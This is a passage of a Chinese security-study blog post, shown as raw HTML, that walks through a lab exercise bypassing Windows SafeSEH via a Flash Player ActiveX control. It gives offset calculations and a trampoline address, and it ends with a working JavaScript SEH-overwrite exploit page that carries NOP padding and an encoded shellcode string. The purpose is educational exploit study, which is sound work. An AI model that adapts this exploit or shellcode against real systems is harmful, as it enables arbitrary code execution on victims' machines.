+</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=nx>shellcode</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h4 id=分析>分析</h4><ul><li>如图，ecx指向的地址<code>0x01DCF4FC</code>是溢出字符串的起始地址，距离栈顶最近的异常函数地址位于<code>0x01DCF610</code>，计算得填充<code>0x114</code>也就是276字节即可覆盖到异常处理函数地址，而第277-280字节放置跳板即可</li></ul><p><img src=https://s3.ax1x.com/2020/11/24/DNFQOA.png loading=lazy alt=地址><br><img src=https://s3.ax1x.com/2020/11/24/DNAZxe.png loading=lazy alt=SEH链><br><img src=https://s3.ax1x.com/2020/11/24/DNAV2D.png loading=lazy alt=异常地址></p><ul><li>使用<code>OllyFindAddr</code>插件的<code>Overflow return address->Find CALL/JMP[EBP+N]</code>选项查找指令，本次实验找到了<code>0x300B2D1C</code>的<code>CALL [EBP+0xC]</code>作为跳板，如图</li></ul><p><img src=https://s3.ax1x.com/2020/11/24/DNAHQe.png loading=lazy alt=跳板></p><ul><li>根据前面的计算把跳板地址放到shellcode相应位置中，保存POC页面，test更改函数如下</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>138</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u2D1C\u300B&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/script&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>书上说此时触发除0异常将会转入shellcode跳板处，但是貌似事先未写入除0操作，于是再次编译插件，在test函数中加入除0操作</li><li>此时，成功在跳板处断下，EBP寄存器内的值是<code>0x01DCF150</code>，根据跳板指示将跳往跳板地址前的4个字节，在此可以加入一个跳转，而shellcode放到后方，如下所示</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>01DCF60C   /EB 06           jmp short 01DCF614			; jump
+</span></span><span class=line><span class=cl>01DCF60E   |90              nop
+</span></span><span class=line><span class=cl>01DCF60F   |90              nop
+</span></span><span class=line><span class=cl>01DCF610   |1C 2D           sbb al,0x2D					; addr
+</span></span><span class=line><span class=cl>01DCF612   |0B30            or esi,dword ptr ds:[eax]	; addr
+</span></span><span class=line><span class=cl>01DCF614   \90              nop							; shellcode payload start
+</span></span></code></pre></td></tr></table></div></div><ul><li>最终的test函数如下所示</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>136</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u06EB\u9090&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u2D1C\u300B&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/script&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>成功执行如图</li></ul><p><img src=https://s3.ax1x.com/2020/11/24/DNljGd.png loading=lazy alt=执行成功></p></section><footer class=article-footer><section class=article-tags><a href=/zh-cn/tags/windows/>Windows</a>
+<a href=/zh-cn/tags/exploit/>Exploit</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-021-%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/><div class=article-details><h2 class=article-title>漏洞学习笔记-021-保护下的堆</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-020-sehop%E7%AE%80%E4%BB%8B/><div class=article-details><h2 class=article-title>漏洞学习笔记-020-SEHOP简介</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/><div class=article-details><h2 class=article-title>漏洞学习笔记-019-利用HeapSpray攻击ASLR</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/><div class=article-details><h2 class=article-title>漏洞学习笔记-018-利用部分覆盖定位</h2></div></a></article><article><a href=/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/><div class=article-details><h2 class=article-title>漏洞学习笔记-017-ASLR简介</h2></div></a></article></div></div></aside><script src=//unpkg.com/@waline/client@v2/dist/waline.js></script>
+<link href=//unpkg.com/@waline/client@v2/dist/waline.css rel=stylesheet><div id=waline class=waline-container></div><style>.waline-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding);--waline-font-size:var(--article-font-size)}.waline-container .wl-count{color:var(--card-text-color-main)}</style><script>Waline.init({avatar:"identicon",dark:'html[data-scheme="dark"]',el:"#waline",emoji:["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/tieba","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/tw-emoji","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/weibo"],lang:"en",locale:{admin:"Misaka"},requiredMeta:["nick","mail"],serverURL:"https://waline.moeomu.com",visitor:"true"})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2022 Moeomu博客</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.12.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#safeseh简介>SafeSEH简介</a><ol><li><a href=#工作>工作</a></li><li><a href=#可行性分析>可行性分析</a></li></ol></li><li><a href=#堆中绕过seh>堆中绕过SEH</a><ol><li><a href=#代码>代码</a></li><li><a href=#说明>说明</a></li></ol></li><li><a href=#利用未启用safeseh的模块来绕过safeseh>利用未启用SafeSEH的模块来绕过SafeSEH</a><ol><li><a href=#代码-1>代码</a></li><li><a href=#实验思路>实验思路</a></li><li><a href=#提前处理>提前处理</a></li><li><a href=#遇到的问题>遇到的问题</a></li></ol></li><li><a href=#利用加载模块以外的地址绕过safeseh>利用加载模块以外的地址绕过SafeSEH</a><ol><li><a href=#跳板>跳板</a></li><li><a href=#代码-2>代码</a><ol><li><a href=#漏洞执行流程>漏洞执行流程</a></li><li><a href=#面临的问题>面临的问题</a></li></ol></li><li><a href=#利用adobe-flash-player-activex控件绕过safeseh>利用Adobe Flash Player ActiveX控件绕过SafeSEH</a><ol><li><a href=#原理>原理</a></li><li><a href=#代码-3>代码</a></li><li><a href=#其它步骤>其它步骤</a></li><li><a href=#触发漏洞>触发漏洞</a></li><li><a href=#分析>分析</a></li></ol></li></ol></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
